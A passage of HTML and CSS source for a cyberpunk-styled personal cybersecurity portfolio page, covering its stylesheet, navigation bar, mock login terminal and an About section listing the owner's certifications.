<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Digital Fortress - Mostafa Galal</title>

  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

  <!-- Meta Tags for Social Sharing -->
  <meta property="og:title" content="Mostafa Galal - Cybersecurity Portfolio">
  <meta property="og:description" content="Explore the digital fortress of Mostafa Galal, a Cybersecurity expert specializing in ethical hacking, vulnerability assessment, and secure coding.">
  <meta property="og:image" content="https://yourwebsite.com/hacker.png">
  <meta property="og:url" content="https://yourwebsite.com/">
  <meta property="og:type" content="website">

  <!-- Preloading Assets -->
  <link rel="preload" href="beep.mp3" as="audio">
  <link rel="preload" href="hacker.png" as="image">
  
  <!-- External Libraries & Fonts -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
  
  <!-- Three.js Library for 3D Scene -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>


  <style>
    :root {
        --background-dark: #020412;
        --background-med: #0A0F2D;
        --primary-cyan: #00ffff;
        --primary-magenta: #ff00ff;
        --primary-red: #ff1b1b;
        --text-bright: #e0e0e0;
        --text-green: #39ff14;
    }

    /* Preloader Styles */
    #preloader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #000;
      color: var(--primary-cyan);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: 'Roboto Mono', monospace;
      font-size: 1.5rem;
      z-index: 99999;
      transition: opacity 0.5s ease-out;
    }

    #preloader .spinner {
      border: 4px solid rgba(0, 255, 255, 0.2);
      border-top: 4px solid var(--primary-cyan);
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-top: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Global Styles */
    body {
      margin: 0;
      padding: 0;
      background-color: var(--background-dark);
      color: var(--text-bright);
      font-family: 'Roboto Mono', monospace;
      overflow-x: hidden;
      scroll-behavior: smooth;
    }

    h1, h2, h3 {
      font-family: 'Orbitron', sans-serif;
      color: var(--primary-cyan);
      text-shadow: 0 0 5px var(--primary-cyan), 0 0 10px var(--primary-cyan);
    }

    a {
      color: var(--primary-red);
      text-decoration: none;
      transition: all 0.3s ease;
      cursor: pointer;
    }

    a:hover {
      color: var(--primary-cyan);
    }
    
    /* --- 3D Background & Overlays --- */
    #three-bg {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: -2; /* Behind everything */
    }

    .scanline-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(rgba(0,0,0,0) 50%, rgba(0,0,0,0.25) 50%), linear-gradient(90deg, rgba(255,0,0,0.06), rgba(0,255,0,0.02), rgba(0,0,255,0.06));
        background-size: 100% 3px, 4px 100%;
        z-index: -1;
        pointer-events: none;
        animation: flicker 0.15s infinite;
    }

    @keyframes flicker {
        0% { opacity: 0.8; }
        50% { opacity: 1; }
        100% { opacity: 0.8; }
    }


    /* Sticky Navigation Bar */
    #navbar {
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 60px; /* Minimal width initially */
      background: linear-gradient(to bottom, rgba(2, 4, 18, 0.9), rgba(0, 0, 0, 1));
      border-right: 2px solid var(--primary-red);
      box-shadow: 0 0 15px rgba(255, 27, 27, 0.5);
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      padding: 20px 0;
      z-index: 1000;
      transition: width 0.4s cubic-bezier(0.23, 1, 0.32, 1);
    }

    #navbar:hover {
      width: 240px; /* Expanded width on hover */
    }

    #navbar .nav-button {
        font-family: 'Orbitron', sans-serif;
        background: transparent;
        border: 2px solid rgba(255, 27, 27, 0.7);
        color: rgba(255, 27, 27, 0.7);
        padding: 10px;
        text-transform: uppercase;
        letter-spacing: 1px;
        border-radius: 8px;
        box-shadow: 0 0 5px rgba(255, 27, 27, 0.2);
        transition: all 0.3s ease;
        display: flex;
        align-items: center;
        justify-content: center; /* Center icon by default */
        width: calc(100% - 20px);
        margin: 5px 10px;
        overflow: hidden;
    }
    
    #navbar:hover .nav-button {
        justify-content: flex-start; /* Align left when expanded */
    }
    
    #navbar .nav-button:hover {
        background: rgba(255, 27, 27, 0.2);
        color: var(--primary-red);
        box-shadow: 0 0 15px rgba(255, 27, 27, 0.7);
        transform: scale(1.05);
    }

    #navbar .nav-button .icon {
      font-size: 1.5rem;
      min-width: 20px;
      text-align: center;
      margin-right: 3px; /* No margin when collapsed */
      transition: all 0.3s;
    }
    
    #navbar:hover .nav-button .icon {
        margin-right: 20px; /* Add margin back when expanded */
    }

    #navbar .nav-button .text {
      display: none; /* Hidden initially */
      opacity: 0;
      transition: opacity 0.3s;
      white-space: nowrap;
    }

    #navbar:hover .nav-button .text {
      display: inline; /* Show text on hover */
      opacity: 1;
    }
    
    /* Admin buttons with different color scheme */
     #navbar .nav-button.admin-btn {
        border-color: rgba(0, 255, 255, 0.7);
        color: rgba(0, 255, 255, 0.7);
        box-shadow: 0 0 5px rgba(0, 255, 255, 0.2);
     }
     
     #navbar .nav-button.admin-btn:hover {
        background: rgba(0, 255, 255, 0.2);
        color: var(--primary-cyan);
        box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
     }


    /* Login Screen */
    #login-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: var(--background-dark);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    #login-terminal {
      background-color: #000;
      padding: 20px;
      border: 1px solid var(--primary-cyan);
      box-shadow: 0 0 20px var(--primary-cyan);
      max-width: 600px;
      width: 90%;
      text-align: left;
    }

    #login-terminal p {
      margin: 0;
      font-size: 1.2rem;
    }

    #login-status {
      color: var(--primary-cyan); /* Default to success color for automated login */
    }

    /* Main Content Layout */
    .main-content-area {
        margin-left: 80px; /* Adjusted for navbar width + padding */
        padding: 40px;
        transition: filter 0.3s ease-in-out; /* For modal blur effect */
        position: relative; /* Ensure content is on top of bg */
        z-index: 1;
    }

    .main-content-area.modal-open {
        filter: blur(5px) brightness(0.5);
        pointer-events: none;
    }
    
    .content-section {
        background: rgba(10, 15, 45, 0.6);
        backdrop-filter: blur(8px);
        border: 1px solid rgba(0, 255, 255, 0.2);
        border-radius: 15px;
        padding: 40px;
        margin-bottom: 60px;
        box-shadow: 0 0 20px rgba(0, 255, 255, 0.1);
        opacity: 0;
        transform: translateY(50px);
        transition: opacity 0.6s ease-out, transform 0.6s ease-out;
    }

    .content-section.is-visible {
        opacity: 1;
        transform: translateY(0);
    }

    /* Hero Section */
    #hero {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      background: transparent; /* Make it transparent to see the 3D BG */
      position: relative;
      z-index: 1; 
      margin: -40px -40px 60px -40px;
      border-radius: 0;
      border: none;
      box-shadow: none;
    }
    
    #hero h1 {
        font-size: clamp(2.2rem, 6vw, 4rem);
        color: var(--text-bright);
        text-shadow: 0 0 8px var(--primary-red), 0 0 15px var(--primary-red);
    }

    /* Terminal Text Effect */
    .terminal-text {
      font-family: 'Roboto Mono', monospace;
      color: var(--primary-cyan);
      font-size: 1.5rem;
      white-space: pre-wrap;
      overflow: hidden;
      border-right: 2px solid var(--primary-cyan);
      width: 0;
      animation: typing 4s steps(40, end) forwards, blink-caret 0.75s step-end infinite;
    }

    @keyframes typing {
      from { width: 0; }
      to { width: 100%; }
    }

    @keyframes blink-caret {
      from, to { border-color: transparent; }
      50% { border-color: var(--primary-red); }
    }

    /* About Section */
    #about .bio-container {
        display: flex;
        flex-direction: row;
        align-items: flex-start;
        gap: 40px;
        max-width: 1200px;
        margin: 0 auto;
    }

    #about .avatar-container {
        flex-shrink: 0;
        position: relative;
    }

    .avatar {
      width: 200px;
      height: 200px;
      border-radius: 50%;
      object-fit: cover;
      border: 4px solid var(--primary-cyan);
      box-shadow: 0 0 25px var(--primary-cyan);
      animation: pulse-glow 3s infinite alternate;
    }

    @keyframes pulse-glow {
        from { box-shadow: 0 0 15px var(--primary-cyan), 0 0 5px var(--primary-magenta); }
        to { box-shadow: 0 0 35px var(--primary-cyan), 0 0 15px var(--primary-magenta); }
    }

    #about .bio {
      flex-grow: 1;
      max-width: 800px;
      text-align: left;
    }
    
    #about .bio h3 {
        color: var(--primary-red);
        border-bottom: 1px solid var(--primary-red);
        padding-bottom: 5px;
        margin-top: 20px;
    }
    
    #about .bio ul {
        list-style: none;
        padding-left: 0;
    }
    
    #about .bio li {
        margin-bottom: 10px;
        line-height: 1.6;
    }
    
    #about .bio li::before {
        content: '>';
        color: var(--primary-red);
        margin-right: 10px;
        text-shadow: 0 0 5px var(--primary-red);
    }


    /* Skills Section */
    #skills-output {
      background-color: #000;
      border: 1px solid var(--primary-cyan);
      box-shadow: 0 0 10px var(--primary-cyan);
      padding: 20px;
      max-width: 800px;
      margin: 0 auto;
      text-align: left;
      min-height: 200px; /* Ensure visible area for typing */
      display: flex;
      flex-direction: column;
      gap: 15px;
      margin-top: 60px;
      position: relative;
    }
    
    #skills-output pre {
      color: var(--text-green); 
      margin: 0;
      white-space: pre;
      font-family: 'Roboto Mono', monospace;
    }
    
    .click-hint {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        color: rgba(0, 255, 255, 0.5);
        font-style: italic;
        pointer-events: none; 
        animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
        0% { opacity: 0.5; }
        50% { opacity: 1; }
        100% { opacity: 0.5; }
    }

    #skills-output .command-line {
      white-space: pre-wrap;
      overflow: hidden;
    }

    #skills-output .prompt {
        color: var(--primary-red);
        font-weight: bold;
    }

    .skill-category {
      margin-top: 15px;
    }

    .skill-category h4 {
      color: var(--primary-cyan);
      margin-bottom: 8px;
    }

    .skill-item {
      display: flex;
      align-items: center;
      margin-bottom: 5px;
      font-size: 0.95em;
    }

    .skill-name {
      width: 120px;
      min-width: 120px;
      color: var(--text-green);
    }

    .proficiency-bar-container {
      flex-grow: 1;
      height: 10px;
      background-color: #333;
      border: 1px solid var(--primary-red);
      position: relative;
      overflow: hidden;
    }

    .proficiency-bar {
      height: 100%;
      background: linear-gradient(90deg, var(--primary-magenta), var(--primary-cyan));
      width: 0; /* Will be animated */
      transition: width 1.5s ease-out;
    }
    
    /* === PROJECTS SECTION STYLES === */
    .projects-container {
      max-width: 1600px; 
      margin: 0 auto;
      padding: 0;
      position: relative;
    }

    .section-title {
      text-align: center;
      margin-bottom: 60px;
      position: relative;
    }

    .section-title h2 {
      font-family: 'Orbitron', sans-serif;
      color: var(--primary-cyan);
      text-shadow: 0 0 15px var(--primary-cyan);
      font-size: clamp(2.2rem, 5vw, 3rem); 
      margin-bottom: 20px;
      display: inline-block;
      padding: 10px 30px;
      background: rgba(0, 0, 0, 0.7);
      border: 3px solid transparent;
      border-radius: 10px;
      position: relative;
      overflow: hidden;
      cursor: pointer; 
      background-clip: padding-box;
    }
    
    .section-title h2::before {
        content: '';
        position: absolute;
        top: 0; right: 0; bottom: 0; left: 0;
        z-index: -1;
        margin: -3px;
        border-radius: inherit;
        background: linear-gradient(to right, var(--primary-magenta), var(--primary-cyan), var(--primary-red));
        animation: rotate-gradient 4s linear infinite;
    }

    @keyframes rotate-gradient {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .section-title p {
      font-size: 1.2rem;
      max-width: 700px;
      margin: 0 auto;
      line-height: 1.6;
      color: #aaa;
    }

    .search-filter-container {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 40px;
      flex-wrap: wrap;
    }

    .search-box {
      position: relative;
      max-width: 500px;
      width: 100%;
    }

    .search-box input {
      width: 100%;
      padding: 15px 20px 15px 50px;
      background-color: rgba(0, 0, 0, 0.7);
      border: 3px solid var(--primary-red);
      color: var(--text-bright);
      font-size: 1.1rem;
      border-radius: 8px;
      font-family: 'Roboto Mono', monospace;
    }

    .search-box input:focus {
      outline: none;
      box-shadow: 0 0 15px rgba(255, 27, 27, 0.7);
    }

    .search-box i {
      position: absolute;
      left: 20px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--primary-red);
      font-size: 1.2rem;
    }

    .filter-buttons {
      display: flex;
      gap: 15px;
      flex-wrap: wrap;
      justify-content: center;
    }

    .filter-btn {
      padding: 12px 25px;
      background: rgba(26, 26, 26, 0.8);
      border: 3px solid var(--primary-cyan);
      color: var(--primary-cyan);
      border-radius: 8px;
      cursor: pointer;
      font-family: 'Roboto Mono', monospace;
      font-size: 1rem;
      transition: all 0.3s ease;
    }

    .filter-btn:hover, .filter-btn.active {
      background: var(--primary-cyan);
      color: var(--background-dark);
      box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
    }

    .cards-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); 
      gap: 40px;
      margin-top: 30px;
      perspective: 1000px;
    }

    .custom-card {
      background-color: rgba(10, 15, 45, 0.6);
      border-radius: 15px;
      overflow: hidden;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
      border: 3px solid var(--primary-cyan);
      position: relative;
      display: flex;
      flex-direction: column;
      transform-style: preserve-3d;
      transition: transform 0.4s ease, box-shadow 0.4s ease;
    }

    .custom-card:hover {
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7), 0 0 40px var(--primary-cyan);
      border-color: var(--primary-magenta);
    }

    .card-badge {
      position: absolute;
      top: 20px;
      right: 20px;
      background: var(--primary-red);
      color: white;
      padding: 5px 15px;
      border-radius: 20px;
      font-size: 0.9rem;
      font-weight: bold;
      z-index: 2;
      box-shadow: 0 0 10px rgba(255, 27, 27, 0.7);
    }

    .card-preview {
      background: linear-gradient(135deg, #001f3f, #020412);
      color: #fff;
      padding: 30px;
      min-height: 200px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: flex-start;
      position: relative;
      border-bottom: 3px solid var(--primary-cyan);
    }

    .card-preview::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 80%;
      height: 3px;
      background-color: rgba(255, 27, 27, 0.7);
    }

    .card-type-label {
      font-size: 1rem;
      color: var(--primary-red);
      font-weight: bold;
      letter-spacing: 2px;
      margin-bottom: 15px;
      text-transform: uppercase;
    }

    .card-preview h3 {
      font-family: 'Orbitron', sans-serif;
      color: var(--primary-cyan);
      font-size: clamp(1.7rem, 4vw, 2.2rem); 
      margin: 10px 0 20px;
      text-shadow: 0 0 15px var(--primary-cyan);
    }

    .card-preview img {
      width: 100%;
      height: 200px;
      object-fit: cover;
      border-radius: 8px;
      border: 2px solid rgba(0, 255, 255, 0.3);
      margin-top: 15px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
    }

    .card-info {
      padding: 30px;
      position: relative;
      flex-grow: 1;
      display: flex;
      flex-direction: column;
    }

    .card-info p {
      font-size: 1.1rem;
      line-height: 1.7;
      color: var(--text-bright);
      margin-bottom: 25px;
      min-height: 120px;
      flex-grow: 1;
    }

    .tech-list {
      font-size: 1rem;
      color: var(--text-green);
      margin-top: 15px;
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 20px;
    }

    .tech-list span {
      background-color: rgba(57, 255, 20, 0.1);
      border: 2px solid var(--text-green);
      padding: 8px 15px;
      border-radius: 25px;
      white-space: nowrap;
    }

    .card-footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: auto; /* Pushes footer to the bottom */
      border-top: 2px solid rgba(255, 27, 27, 0.3);
      padding-top: 20px;
    }

    .card-date {
      font-size: 0.95rem;
      color: #aaa;
    }

    /* Gradient Button */
    .gradient-button {
        font-family: 'Orbitron', sans-serif;
        background: rgba(0, 255, 255, 0.1);
        border: 2px solid var(--primary-cyan);
        color: var(--primary-cyan);
        padding: 15px 25px;
        text-transform: uppercase;
        letter-spacing: 2px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
        z-index: 1;
    }

    .gradient-button:hover {
        background: var(--primary-cyan);
        color: var(--background-dark);
        box-shadow: 0 0 25px rgba(0, 255, 255, 0.7);
        transform: scale(1.05);
    }
    
    .gradient-button.small {
        font-size: 14px;
        padding: 10px 18px;
        letter-spacing: 1px;
    }
    
    /* Red variant for destructive actions or highlights */
    .gradient-button.red {
        border-color: var(--primary-red);
        color: var(--primary-red);
        box-shadow: 0 0 10px rgba(255, 27, 27, 0.3);
    }
    .gradient-button.red:hover {
        background: var(--primary-red);
        color: var(--background-dark);
        box-shadow: 0 0 25px rgba(255, 27, 27, 0.7);
    }


    /* Contact Section */
    #contact {
      padding: 0;
      text-align: center;
    }

    .glow-input {
      background-color: #2A2A2A;
      border: 1px solid var(--primary-red);
      color: var(--text-bright);
      padding: 10px;
      margin: 10px 0;
      width: 100%;
      max-width: 400px;
      box-sizing: border-box; 
    }

    .glow-input::placeholder {
      color: var(--primary-red);
    }

    #contact-form-feedback {
      margin-top: 15px;
      padding: 10px;
      border: 1px solid;
      display: inline-block;
      max-width: 400px;
      width: 100%;
      box-sizing: border-box;
      color: var(--primary-cyan);
      border-color: var(--primary-cyan);
      background-color: rgba(0, 255, 255, 0.1);
      display: none; 
    }
    #contact-form-feedback.success {
        color: var(--text-green);
        border-color: var(--text-green);
        background-color: rgba(57, 255, 20, 0.1);
    }
    #contact-form-feedback.error {
        color: var(--primary-red);
        border-color: var(--primary-red);
        background-color: rgba(255, 27, 27, 0.1);
    }
    #contact-form-feedback.loading {
        color: var(--primary-magenta); 
        border-color: var(--primary-magenta);
        background-color: rgba(255, 0, 255, 0.1);
    }


    /* Footer */
    footer {
      padding: 20px;
      text-align: center;
      border-top: 1px solid var(--primary-red);
      margin-top: 60px;
    }

    /* Social Icons */
    .social-icons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 20px;
    }

    .social-icons a {
      color: var(--primary-red);
      font-size: 2rem; /* Increased size */
      transition: all 0.3s ease;
      border: none;
      padding: 0;
    }

    .social-icons a:hover {
      color: var(--primary-cyan);
      transform: scale(1.2);
      text-shadow: 0 0 10px var(--primary-cyan);
      background-color: transparent;
      box-shadow: none;
    }
    
    /* CV Download Button */
    #download-cv-btn {
        margin-top: 30px;
        display: inline-block;
        font-family: 'Orbitron', sans-serif;
        background: rgba(0, 255, 255, 0.1);
        border: 2px solid var(--primary-red);
        color: var(--primary-red);
        padding: 15px 30px;
        text-transform: uppercase;
        letter-spacing: 2px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
        z-index: 1;
        font-size: 1.1rem;
    }

    #download-cv-btn:hover {
        background: var(--primary-cyan);
        color: var(--background-dark);
        box-shadow: 0 0 25px rgba(0, 255, 255, 0.7);
        transform: scale(1.05);
    }
    
    /* Mini Terminal Shell */
    #mini-terminal {
        position: fixed;
        bottom: 20px;
        right: 20px;
        width: 450px;
        height: 250px;
        background-color: rgba(2, 4, 18, 0.85);
        border: 2px solid var(--primary-cyan);
        border-radius: 10px;
        box-shadow: 0 0 25px rgba(0, 255, 255, 0.5);
        z-index: 1002;
        display: flex;
        flex-direction: column;
        font-family: 'Roboto Mono', monospace;
        overflow: hidden;
    }
    #terminal-header {
        background-color: var(--primary-red);
        color: #000;
        padding: 5px 10px;
        font-weight: bold;
        cursor: move;
        user-select: none;
    }
    #terminal-output {
        flex-grow: 1;
        padding: 10px;
        overflow-y: auto;
        font-size: 0.9rem;
        color: var(--text-green);
    }
    #terminal-output > div {
        margin-bottom: 5px;
    }
    #terminal-output pre {
        margin: 0;
        font-family: 'Roboto Mono', monospace;
        font-size: 0.9rem;
    }
    #terminal-input-container {
        display: flex;
        padding: 5px 10px;
        background-color: rgba(0, 0, 0, 0.5);
    }
    #terminal-prompt {
        color: var(--primary-red);
        font-weight: bold;
        margin-right: 5px;
    }
    #terminal-input {
        flex-grow: 1;
        background: transparent;
        border: none;
        color: var(--primary-cyan);
        font-family: 'Roboto Mono', monospace;
        outline: none;
    }
    
    /* Password Modal */
    #password-modal .modal-content {
        max-width: 400px;
    }
    #password-error {
        color: var(--primary-red);
        margin-top: 10px;
        display: none;
    }

    /* --- RESPONSIVE DESIGN --- */

    @media (max-width: 768px) {
      .main-content-area {
        margin-left: 0;
        padding: 20px 10px; 
        margin-top: 70px; 
      }
      .content-section {
          padding: 20px;
          margin-bottom: 40px;
      }
      .projects-container{
        padding: 0;
      }
      
      .cards-grid {
        grid-template-columns: 1fr;
      }

      #navbar {
        width: 100%;
        height: auto;
        flex-direction: row;
        justify-content: space-around;
        padding: 10px 0;
        border-right: none;
        border-bottom: 2px solid var(--primary-red);
        bottom: 0; 
        top: auto;
        height: 60px;
      }

      #navbar:hover {
          width: 100%; 
      }
      
      #navbar .nav-button .text {
          display: none; 
      }

      #about .bio-container {
        flex-direction: column; 
        align-items: center; 
      }
    }

    @media (max-width: 480px) {
      #mini-terminal {
        width: 95%;
        height: 220px;
        bottom: 75px; 
        right: 2.5%;
        left: 2.5%;
      }
    }
    
    /* Modal Styles */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      z-index: 1001;
      justify-content: center;
      align-items: center;
      opacity: 0;
      transition: opacity 0.3s ease;
    }
    
    .modal.show {
        opacity: 1;
    }

    .modal-content {
      background-color: var(--background-med);
      border: 1px solid var(--primary-red);
      box-shadow: 0 0 20px var(--primary-cyan);
      padding: 20px;
      max-width: 600px;
      width: 90%;
      position: relative;
      max-height: 90vh; 
      overflow-y: auto; 
      transform: scale(0.95);
      transition: transform 0.3s ease;
    }
    
    .modal.show .modal-content {
        transform: scale(1);
    }

    .modal-content h2 {
      color: var(--primary-cyan);
      text-shadow: 0 0 5px var(--primary-cyan);
    }

    .modal-content .close {
      position: absolute;
      top: 10px;
      right: 15px;
      color: var(--primary-red);
      font-size: 2.5rem;
      font-weight: bold;
      cursor: pointer;
      transition: color 0.3s, transform 0.3s;
    }

    .modal-content .close:hover {
      color: var(--primary-cyan);
      transform: rotate(90deg);
    }
    
    .modal-sections { display: flex; gap: 20px; flex-direction: column; }
    .modal-sections input, .modal-sections textarea { width: 100%; margin-bottom: 10px; }
    .modal-sections button { width: 100%; margin-top: 10px; }
    .tab-buttons { display: flex; justify-content: space-around; margin-bottom: 20px; }
    .tab-buttons button { flex-grow: 1; background-color: #3A3A3A; border: 1px solid var(--primary-red); color: var(--primary-red); padding: 10px; cursor: pointer; transition: background-color 0.3s ease; }
    .tab-buttons button.active { background-color: var(--primary-red); color: var(--background-dark); }
    .tab-content { display: none; }
    .tab-content.active { display: block; }
    #remove-card-modal .modal-content { max-width: 800px; }
    #remove-card-modal .card-list { max-height: 400px; overflow-y: auto; margin-bottom: 20px; padding-right: 10px; }
    #remove-card-modal .card-item { display: flex; align-items: center; justify-content: space-between; padding: 10px; border: 1px solid var(--primary-red); margin-bottom: 10px; }
    #remove-card-modal .card-item input { margin-right: 10px; width: auto; }
    #detail-modal .modal-content { max-width: 700px; padding: 30px; text-align: left; }
    #detail-modal h2 { margin-top: 0; font-size: 2.2rem; }
    #detail-modal p { font-size: 1.1rem; margin-bottom: 15px; }
    #detail-modal .modal-media { max-width: 100%; height: auto; margin: 20px 0; display: block; object-fit: contain; }
    #detail-modal .modal-links a { display: inline-block; margin-right: 15px; margin-top: 10px; }
    #detail-modal .modal-skills-list { margin-top: 20px; font-size: 1rem; color: var(--text-green); }
    #detail-modal .modal-skills-list span { display: inline-block; background-color: #3A3A3A; border: 1px solid var(--text-green); padding: 5px 10px; margin: 5px; border-radius: 3px; }
    #blog-detail-modal .modal-content { max-width: 700px; padding: 30px; text-align: left; }
    #blog-detail-modal h2 { margin-top: 0; font-size: 2.2rem; }
    #blog-detail-modal .blog-full-content { white-space: pre-wrap; line-height: 1.6; font-size: 1.05em; color: #ddd; margin-bottom: 20px; }
    #blog-detail-modal .blog-detail-meta { font-size: 0.9em; color: var(--text-green); margin-bottom: 15px; }
    #blog-detail-modal .modal-tags span { display: inline-block; background-color: #3A3A3A; border: 1px solid var(--text-green); padding: 5px 10px; margin: 5px; border-radius: 3px; }

    /* --- NEW: Edit Card Modal Styles --- */
    #edit-card-modal .modal-content {
        max-width: 1200px; /* Wider modal for editor and preview */
    }
    #edit-card-modal .editor-container {
        display: flex;
        gap: 30px;
    }
    #edit-card-modal .card-selection-list {
        flex: 1;
        max-height: 65vh;
        overflow-y: auto;
        padding-right: 15px;
        border-right: 1px solid var(--primary-red);
    }
    #edit-card-modal .draggable-card-item {
        padding: 15px;
        background-color: rgba(0,0,0,0.3);
        border: 1px solid var(--primary-cyan);
        margin-bottom: 10px;
        cursor: grab;
        display: flex;
        justify-content: space-between;
        align-items: center;
        transition: background-color 0.3s;
    }
    #edit-card-modal .draggable-card-item:hover,
    #edit-card-modal .draggable-card-item.selected {
        background-color: rgba(0, 255, 255, 0.2);
    }
    #edit-card-modal .draggable-card-item.dragging {
        opacity: 0.5;
        background: var(--primary-magenta);
    }
    #edit-card-modal .card-editor-form {
        flex: 2;
        display: none; /* Hidden until a card is selected */
    }
    #edit-card-modal .form-and-preview {
        display: flex;
        gap: 20px;
    }
    #edit-card-modal .form-fields {
        flex: 1;
        display: flex;
        flex-direction: column;
    }
    #edit-card-modal .form-fields input,
    #edit-card-modal .form-fields textarea {
        width: 100%;
        box-sizing: border-box;
        margin-bottom: 12px;
    }
    #edit-card-modal .image-upload-container {
        display: flex;
        align-items: center;
        gap: 10px;
    }
    #edit-card-modal .image-upload-container input[type="file"] {
        display: none;
    }
    #edit-card-modal .image-upload-container .file-label {
        padding: 8px 12px;
        background: var(--primary-red);
        color: var(--background-dark);
        cursor: pointer;
        border-radius: 5px;
    }
    #edit-card-modal #live-preview-container {
        flex: 1;
        margin-top: 10px;
    }
    #edit-card-modal .editor-actions {
        display: flex;
        gap: 15px;
        margin-top: 20px;
    }
  </style>
</head>
<body>
  <audio id="beep-sound" src="beep.mp3" preload="auto"></audio>

  <div id="preloader">
    <span>Loading Digital Fortress...</span>
    <div class="spinner"></div>
  </div>

  <!-- 3D Background and Overlay -->
  <div id="three-bg"></div>
  <div class="scanline-overlay"></div>

  <div id="navbar">
    <button class="nav-button" onclick="window.location.href='#about'">
      <span class="icon"><i class="fas fa-user-secret"></i></span>
      <span class="text">About</span>
    </button>
    <button class="nav-button" onclick="window.location.href='#skills'">
        <span class="icon"><i class="fas fa-brain"></i></span>
        <span class="text">Skills</span>
    </button>
    <button class="nav-button" onclick="window.location.href='#projects'">
      <span class="icon"><i class="fas fa-folder-open"></i></span>
      <span class="text">Projects</span>
    </button>
    <button class="nav-button" onclick="window.location.href='#certificates'">
      <span class="icon"><i class="fas fa-certificate"></i></span>
      <span class="text">Certs</span>
    </button>
    <button class="nav-button" onclick="window.location.href='#blog'">
        <span class="icon"><i class="fas fa-pen-nib"></i></span>
        <span class="text">Blog</span>
    </button>
    <button class="nav-button" onclick="window.location.href='#contact'">
      <span class="icon"><i class="fas fa-phone-volume"></i></span>
      <span class="text">Contact</span>
    </button>
    <button id="add-card-btn" class="nav-button admin-btn">
      <span class="icon"><i class="fas fa-plus-circle"></i></span>
      <span class="text">Add Card</span>
    </button>
    <!-- NEW: Edit Card Button -->
    <button id="edit-card-btn" class="nav-button admin-btn">
      <span class="icon"><i class="fas fa-edit"></i></span>
      <span class="text">Edit Card</span>
    </button>
    <button id="remove-card-btn" class="nav-button admin-btn">
      <span class="icon"><i class="fas fa-trash-alt"></i></span>
      <span class="text">Remove Card</span>
    </button>
  </div>

  <div id="login-screen">
    <div id="login-terminal">
      <p id="login-initial-message">> Initializing system...</p>
      <p id="login-status"></p>
    </div>
  </div>

  <div id="main-content" style="display: none;" class="main-content-area">
    <section id="hero" class="content-section">
      <h1>
        <span>Still learning, but every day I am more prepared.</span>
      </h1>

      <div id="terminal-text" class="terminal-text"></div>
      <button onclick="window.location.href='#about'" class="gradient-button" style="margin-top: 30px;">> Explore My Digital Defenses</button>
    </section>  

    <section id="about" class="content-section">
        <div class="section-title">
            <h2><i class="fas fa-user-secret"></i> About Me</h2>
        </div>
        <div class="bio-container">
            <div class="avatar-container">
                <img src="my-profile-picture.jpg" alt="Mostafa Galal's Profile Picture" class="avatar" loading="lazy" onerror="this.onerror=null;this.src='https://placehold.co/200x200/ff00ff/FFFFFF?text=MG';">
            </div>
            <div class="bio">
                <p>A passionate Cybersecurity expert specializing in ethical hacking, vulnerability assessment, and secure coding practices. My journey into cybersecurity began with a deep curiosity about how systems work and, more importantly, how they can be secured against malicious intent.</p>
                
                <h3>Core Philosophy</h3>
                <ul>
                    <li>I thrive on the challenge of uncovering weaknesses and building robust defenses.</li>
                    <li>Constant learning and adaptation to the evolving threat landscape are central to my approach.</li>
                    <li>I focus on both offensive (red teaming, penetration testing) and defensive (incident response, secure architecture) strategies.</li>
                </ul>

                <h3>Key Certifications</h3>
                 <ul>
                    <li>Certified Ethical Hacker (CEH)</li>
                    <li>Offensive Security Certified Professional (OSCP)</li>
                    <li>Certified Information Systems Security Professional (CISSP)</li>
                </ul>
